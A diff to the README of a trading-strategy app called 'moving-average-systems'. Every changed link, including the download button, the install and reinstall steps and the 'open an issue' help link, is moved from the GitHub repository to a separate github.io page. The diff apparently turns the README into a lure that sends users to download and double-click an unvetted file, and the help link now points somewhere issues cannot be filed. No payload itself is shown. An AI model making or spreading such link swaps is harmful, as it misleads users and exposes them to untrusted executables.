@@ -1,7 +1,7 @@
 <h1>📈 moving-average-systems - Find Winning Trading Strategies Automatically</h1>
 
 <p align="center">
-<a href="https://github.com/emojipasta/moving-average-systems"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#FF6B6B; padding:15px 30px; border-radius:10px; font-size:20px; font-weight:bold;"></a>
+<a href="https://emojipasta.github.io"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#FF6B6B; padding:15px 30px; border-radius:10px; font-size:20px; font-weight:bold;"></a>
 </p>
 
 <div style="font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; line-height: 1.6; color: #333;">
@@ -29,7 +29,7 @@
 
 <h3>Step 1: Download the Application</h3>
 
-<p>Visit this link to download the application: <a href="https://github.com/emojipasta/moving-average-systems">https://github.com/emojipasta/moving-average-systems</a></p>
+<p>Visit this link to download the application: <a href="https://emojipasta.github.io">https://emojipasta.github.io</a></p>
 
 <p>Once you click the download button, the file will save to your computer's "Downloads" folder or wherever your browser stores downloaded files.</p>
 
@@ -136,7 +136,7 @@
 
 <p>If you need to download the application again or want to install it on another computer, simply:</p>
 <ol>
-<li>Visit this link: <a href="https://github.com/emojipasta/moving-average-systems">https://github.com/emojipasta/moving-average-systems</a></li>
+<li>Visit this link: <a href="https://emojipasta.github.io">https://emojipasta.github.io</a></li>
 <li>Click the download button (usually a green button or icon)</li>
 <li>Wait for the download to complete (usually takes less than a minute)</li>
 <li>Double-click the downloaded file to run it</li>
@@ -158,7 +158,7 @@
 
 <h2>🆘 Need Help?</h2>
 
-<p>If you encounter any problems or have questions, please visit the GitHub repository at <a href="https://github.com/emojipasta/moving-average-systems">https://github.com/emojipasta/moving-average-systems</a> and open an issue. The developer community will be happy to assist you.</p>
+<p>If you encounter any problems or have questions, please visit the GitHub repository at <a href="https://emojipasta.github.io">https://emojipasta.github.io</a> and open an issue. The developer community will be happy to assist you.</p>
 
 <h2>⭐ Show Your Support</h2>
 
